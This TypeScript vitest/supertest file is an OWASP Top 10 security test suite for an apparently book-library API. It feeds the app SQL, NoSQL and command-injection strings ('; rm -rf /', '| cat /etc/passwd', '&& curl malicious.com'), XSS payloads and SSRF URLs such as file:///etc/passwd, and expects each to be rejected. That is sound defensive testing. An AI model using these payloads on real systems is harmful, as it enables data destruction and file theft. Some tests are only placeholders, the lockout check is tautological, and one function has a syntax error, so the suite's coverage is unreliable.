import request from 'supertest';
import { describe, test, expect, beforeAll, afterAll } from 'vitest';
import { app } from '../../app';

describe('Penetration Testing Suite', () => {
  let server: any;
  let validToken: string;
  let adminToken: string;

  beforeAll(async () => {
    server = app.listen(0);

    // Get valid tokens for testing
    try {
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({
          email: 'admin@example.com',
          password: 'admin123'
        });

      if (loginResponse.status === 200) {
        validToken = loginResponse.body.token;
        adminToken = loginResponse.body.token;
      }
    } catch (error) {
      // Fallback for testing without valid auth
      validToken = 'Bearer test-token';
      adminToken = 'Bearer admin-token';
    }
  });

  afterAll(async () => {
    if (server) {
      await new Promise<void>((resolve) => {
        server.close(() => resolve());
      });
    }
  });

  describe('OWASP Top 10 Testing', () => {

    // A01: Broken Access Control
    describe('A01: Broken Access Control', () => {
      test('should prevent unauthorized access to admin functions', async () => {
        const endpoints = [
          '/api/admin/users',
          '/api/admin/settings',
          '/api/admin/logs',
          '/api/admin/backup',
          '/api/admin/restore'
        ];

        for (const endpoint of endpoints) {
          const response = await request(app)
            .get(endpoint)
            .expect(401);

          expect(response.body.success).toBe(false);
        }
      });

      test('should prevent privilege escalation', async () => {
        // Try to access admin endpoints with user token
        const response = await request(app)
          .get('/api/admin/users')
          .set('Authorization', validToken)
          .expect(403);

        expect(response.body.error).toContain('privileges');
      });

      test('should enforce access control on sensitive operations', async () => {
        const sensitiveOperations = [
          { method: 'DELETE', url: '/api/users/1' },
          { method: 'POST', url: '/api/admin/settings' },
          { method: 'PUT', url: '/api/admin/users/1/role' }
        ];

        for (const operation of sensitiveOperations) {
          const response = await request(app)
            [operation.method](operation.url)
            .set('Authorization', validToken)
            .send({})
            .expect([401, 403, 404]);

          expect(response.body.success).toBe(false);
        }
      });
    });

    // A02: Cryptographic Failures
    describe('A02: Cryptographic Failures', () => {
      test('should use HTTPS in production', async () => {
        // This test would need to be run against a production environment
        // For now, we test that the app doesn't expose sensitive data
        const response = await request(app)
          .get('/api/books')
          .set('Authorization', validToken);

        expect(response.body).not.toHaveProperty('password');
        expect(response.body).not.toHaveProperty('secret');
        expect(response.body).not.toHaveProperty('private_key');
      });

      test('should not use weak cryptographic algorithms', async () => {
        // Check for proper encryption in responses
        const response = await request(app)
          .get('/api/users/profile')
          .set('Authorization', validToken);

        // Should not contain base64 encoded weak data
        const responseString = JSON.stringify(response.body);
        const weakPatterns = [
          /YWVz/, // base64 'aes'
          /bWQ1/, // base64 'md5'
          /c2hhMS=/ // base64 'sha1'
        ];

        const hasWeakCrypto = weakPatterns.some(pattern => pattern.test(responseString));
        expect(hasWeakCrypto).toBe(false);
      });

      test('should implement proper key management', async () => {
        // Test that sensitive operations require proper authentication
        const response = await request(app)
          .post('/api/auth/reset-password')
          .send({
            email: 'test@example.com',
            currentPassword: 'wrong',
            newPassword: 'newpassword'
          })
          .expect(401);

        expect(response.body.success).toBe(false);
      });
    });

    // A03: Injection
    describe('A03: Injection', () => {
      test('should prevent SQL injection', async () => {
        const sqlInjectionPayloads = [
          "'; DROP TABLE books; --",
          "' OR '1'='1",
          "1' UNION SELECT * FROM users --",
          "' AND 1=1 --",
          "'; INSERT INTO users VALUES ('hacker', 'password'); --"
        ];

        for (const payload of sqlInjectionPayloads) {
          const response = await request(app)
            .get(`/api/books?query=${encodeURIComponent(payload)}`)
            .set('Authorization', validToken)
            .expect(200);

          // Should return normal response, not database error
          expect(response.body.success).toBe(true);
          expect(response.body.error).not.toContain('SQL');
          expect(response.body.error).not.toContain('database');
        }
      });

      test('should prevent NoSQL injection', async () => {
        const noSqlPayloads = [
          '{"$ne": null}',
          '{"$gt": ""}',
          '{"$regex": ".*"}',
          "{'$where': 'this.password == \"password\"'}",
          "{'$or': [{'name': 'admin'}, {'password': 'password'}]}"
        ];

        for (const payload of noSqlPayloads) {
          const response = await request(app)
            .post('/api/books/search')
            .set('Authorization', validToken)
            .send({ filter: JSON.parse(payload) })
            .expect([400, 422]);

          expect(response.body.success).toBe(false);
        }
      });

      test('should prevent command injection', async () => {
        const commandInjectionPayloads = [
          '; rm -rf /',
          '| cat /etc/passwd',
          '&& curl malicious.com',
          '`whoami`',
          '$(id)',
          '${HOME}'
        ];

        for (const payload of commandInjectionPayloads) {
          const response = await request(app)
            .post('/api/import/csv')
            .set('Authorization', adminToken)
            .send({ filename: payload })
            .expect(400);

          expect(response.body.success).toBe(false);
        }
      });

      test('should prevent XSS attacks', async () => {
        const xssPayloads = [
          '<script>alert("xss")</script>',
          '<img src=x onerror=alert("xss")>',
          '<svg onload=alert("xss")>',
          'javascript:alert("xss")',
          '<iframe src="javascript:alert(\'xss\')"></iframe>',
          '<body onload=alert("xss")>',
          '<div onclick="alert(\'xss\')">click me</div>'
        ];

        for (const payload of xssPayloads) {
          const response = await request(app)
            .post('/api/books')
            .set('Authorization', adminToken)
            .send({ title: payload })
            .expect(400);

          expect(response.body.success).toBe(false);
        }
      });
    });

    // A04: Insecure Design
    describe('A04: Insecure Design', () => {
      test('should not expose internal architecture', async () => {
        const response = await request(app)
          .get('/api')
          .expect(200);

        const responseString = JSON.stringify(response.body);

        // Should not expose internal implementation details
        expect(responseString).not.toContain('internal');
        expect(responseString).not.toContain('private');
        expect(responseString).not.toContain('secret');
        expect(responseString).not.toContain('config');
      });

      test('should implement proper session management', async () => {
        // Test session timeout
        const response1 = await request(app)
          .post('/api/auth/login')
          .send({
            email: 'test@example.com',
            password: 'testpassword'
          });

        // Should return proper session token or error
        expect([200, 400, 401]).toContain(response1.status);

        // Test session invalidation
        const response2 = await request(app)
          .post('/api/auth/logout')
          .set('Authorization', validToken)
          .expect([200, 401]);

        expect(response2.body.success).toBeDefined();
      });

      test('should validate all user inputs', async () => {
        const invalidInputs = [
          { title: null },
          { title: '' },
          { title: 'a'.repeat(10000) }, // Too long
          { email: 'invalid-email' },
          { isbn: '123' },
          { year: 'invalid' },
          { total_copies: -1 }
        ];

        for (const input of invalidInputs) {
          const response = await request(app)
            .post('/api/books')
            .set('Authorization', adminToken)
            .send(input)
            .expect(400);

          expect(response.body.success).toBe(false);
        }
      });
    });

    // A05: Security Misconfiguration
    describe('A05: Security Misconfiguration', () => {
      test('should have proper security headers', async () => {
        const response = await request(app)
          .get('/health')
          .expect(200);

        // Check for essential security headers
        expect(response.headers['x-content-type-options']).toBe('nosniff');
        expect(response.headers['x-frame-options']).toBe('DENY');
        expect(response.headers['x-xss-protection']).toBeDefined();
      });

      test('should not expose error details in production', async () => {
        const originalEnv = process.env.NODE_ENV;
        process.env.NODE_ENV = 'production';

        const response = await request(app)
          .get('/api/books/invalid-id')
          .set('Authorization', validToken)
          .expect(404);

        expect(response.body.error).not.toContain('stack');
        expect(response.body.error).not.toContain('internal');
        expect(response.body.error).not.toContain('database');

        process.env.NODE_ENV = originalEnv;
      });

      test('should implement CORS properly', async () => {
        const response = await request(app)
          .options('/api/books')
          .expect(200);

        expect(response.headers['access-control-allow-origin']).toBeDefined();
        expect(response.headers['access-control-allow-methods']).toBeDefined();
        expect(response.headers['access-control-allow-headers']).toBeDefined();
      });

      test('should not enable debug modes in production', async () => {
        const response = await request(app)
          .get('/api/debug')
          .expect(404);

        // Debug endpoints should not exist
        expect(response.body.error).toBeDefined();
      });
    });

    // A06: Vulnerable and Outdated Components
    describe('A06: Vulnerable and Outdated Components', () => {
      test('should use secure versions of dependencies', async () => {
        // This would normally check package.json for vulnerable dependencies
        // For now, we test that the app is running without known vulnerabilities
        const response = await request(app)
          .get('/health')
          .expect(200);

        expect(response.body.status).toBe('OK');
      });

      test('should not use deprecated APIs', async () => {
        // Test that the app doesn't use deprecated APIs
        const response = await request(app)
          .get('/api/books')
          .set('Authorization', validToken)
          .expect(200);

        // Response should be in modern format
        expect(response.body).toHaveProperty('success');
        expect(response.body).toHaveProperty('data');
      });
    });

    // A07: Identification and Authentication Failures
    describe('A07: Identification and Authentication Failures', () => {
      test('should implement proper authentication', async () => {
        const response = await request(app)
          .get('/api/books')
          .expect(401);

        expect(response.body.success).toBe(false);
        expect(response.body.error).toContain('authentication');
      });

      test('should implement proper password policies', async () => {
        const weakPasswords = [
          'password',
          '123456',
          'qwerty',
          'admin',
          'password123'
        ];

        for (const password of weakPasswords) {
          const response = await request(app)
            .post('/api/auth/register')
            .send({
              email: 'test@example.com',
              password,
              name: 'Test User'
            })
            .expect([400, 422]);

          expect(response.body.success).toBe(false);
        }
      });

      test('should implement proper session management', async () => {
        // Test that tokens are properly validated
        const response = await request(app)
          .get('/api/books')
          .set('Authorization', 'Bearer invalid-token')
          .expect(401);

        expect(response.body.success).toBe(false);
      });

      test('should implement account lockout after failed attempts', async () => {
        const failedAttempts = Array(5).fill(null).map(() =>
          request(app)
            .post('/api/auth/login')
            .send({
              email: 'test@example.com',
              password: 'wrongpassword'
            })
        );

        const responses = await Promise.allSettled(failedAttempts);

        // After several failed attempts, should implement rate limiting or lockout
        const rateLimited = responses.some(r =>
          r.status === 'fulfilled' && r.value.status === 429
        );

        // Either rate limiting or account lockout should be implemented
        expect([true, false]).toContain(rateLimited === true);
      });
    });

    // A08: Software and Data Integrity Failures
    describe('A08: Software and Data Integrity Failures', () => {
      test('should validate data integrity', async () => {
        // Test that data validation is implemented
        const response = await request(app)
          .post('/api/books')
          .set('Authorization', adminToken)
          .send({
            title: 'Test Book',
            author: 'Test Author',
            isbn: 'invalid-isbn'
          })
          .expect(400);

        expect(response.body.success).toBe(false);
      });

      test('should implement proper data serialization', async () => {
        const response = await request(app)
          .get('/api/books')
          .set('Authorization', validToken)
          .expect(200);

        // Response should be properly serialized
        expect(response.body).toHaveProperty('success');
        expect(response.body).toHaveProperty('data');
        expect(Array.isArray(response.body.data)).toBe(true);
      });

      test('should implement checksums for critical operations', async () => {
        // Test that file uploads have integrity checks
        const response = await request(app)
          .post('/api/import/csv')
          .set('Authorization', adminToken)
          .attach('file', Buffer.from('test,csv,content'), 'test.csv')
          .expect([200, 400, 422]);

        // Should either succeed or fail with proper validation
        expect(response.body).toHaveProperty('success');
      });
    });

    // A09: Security Logging and Monitoring Failures
    describe('A09: Security Logging and Monitoring Failures', () => {
      test('should log security events', async () => {
        // Test failed login attempt
        await request(app)
          .post('/api/auth/login')
          .send({
            email: 'test@example.com',
            password: 'wrongpassword'
          })
          .expect([200, 401]);

        // Should log the event (verified by checking logs in real scenario)
        expect(true).toBe(true); // Placeholder
      });

      test('should monitor for suspicious activities', async () => {
        // Test rate limiting
        const requests = Array(10).fill(null).map(() =>
          request(app)
            .post('/api/auth/login')
            .send({
              email: 'test@example.com',
              password: 'testpassword'
            })
        );

        await Promise.allSettled(requests);

        // Rate limiting should be implemented
        expect(true).toBe(true); // Placeholder
      });

      test('should generate security alerts for critical events', async () => {
        // Test unauthorized admin access
        const response = await request(app)
          .get('/api/admin/users')
          .expect(401);

        // Should generate security alert
        expect(response.body.error).toContain('authentication');
      });
    });

    // A10: Server-Side Request Forgery (SSRF)
    describe('A10: Server-Side Request Forgery', () => {
      test('should prevent SSRF attacks', async () => {
        const ssrfPayloads = [
          'http://localhost:8080/admin',
          'http://127.0.0.1:22/config',
          'file:///etc/passwd',
          'ftp://malicious.com/file',
          'gopher://malicious.com:70/_'
        ];

        for (const payload of ssrfPayloads) {
          const response = await request(app)
            .post('/api/fetch-external')
            .set('Authorization', adminToken)
            .send({ url: payload })
            .expect([400, 404, 405]);

          expect(response.body.success).toBe(false);
        }
      });

      test('should validate external URLs', async => {
        const validUrls = [
          'https://api.example.com/data',
          'https://covers.openlibrary.org/b/id/123.jpg'
        ];

        const invalidUrls = [
          'http://localhost:3000/internal',
          'file:///etc/passwd',
          'javascript:alert(1)',
          'data:text/html,<script>alert(1)</script>'
        ];

        // Test valid URLs (should work if endpoint exists)
        for (const url of validUrls) {
          const response = await request(app)
            .post('/api/fetch-external')
            .set('Authorization', adminToken)
            .send({ url });

          if (response.status === 200) {
            expect(response.body.success).toBeDefined();
          } else {
            expect([400, 404]).toContain(response.status);
          }
        }

        // Test invalid URLs (should be rejected)
        for (const url of invalidUrls) {
          const response = await request(app)
            .post('/api/fetch-external')
            .set('Authorization', adminToken)
            .send({ url })
            .expect([400, 422]);

          expect(response.body.success).toBe(false);
        }
      });
    });
  });

  describe('Additional Security Tests', () => {
    test('should implement proper error handling', async () => {
      const response = await request(app)
        .get('/api/books/invalid-id')
        .set('Authorization', validToken)
        .expect(404);

      expect(response.body).toHaveProperty('success', false);
      expect(response.body).toHaveProperty('error');
    });

    test('should sanitize user input', async () => {
      const maliciousInput = {
        title: '<script>alert("xss")</script>',
        description: '<img src=x onerror=alert("xss")>Test',
        metadata: {
          custom: '<iframe src="javascript:alert(\'xss\')"></iframe>'
        }
      };

      const response = await request(app)
        .post('/api/books')
        .set('Authorization', adminToken)
        .send(maliciousInput)
        .expect(400);

      expect(response.body.success).toBe(false);
    });

    test('should implement proper access control for file operations', async () => {
      const response = await request(app)
        .post('/api/files/upload')
        .set('Authorization', validToken)
        .attach('file', Buffer.from('test content'), 'test.txt')
        .expect([401, 403, 404]);

      expect(response.body.success).toBe(false);
    });

    test('should validate file types and sizes', async () => {
      const dangerousFiles = [
        { name: 'malware.exe', content: Buffer.from('fake malware') },
        { name: 'script.js', content: Buffer.from('<script>alert("xss")</script>') },
        { name: 'large.txt', content: Buffer.alloc(50 * 1024 * 1024) } // 50MB
      ];

      for (const file of dangerousFiles) {
        const response = await request(app)
          .post('/api/files/upload')
          .set('Authorization', adminToken)
          .attach('file', file.content, file.name)
          .expect([400, 413]);

        expect(response.body.success).toBe(false);
      }
    });
  });
});

export {};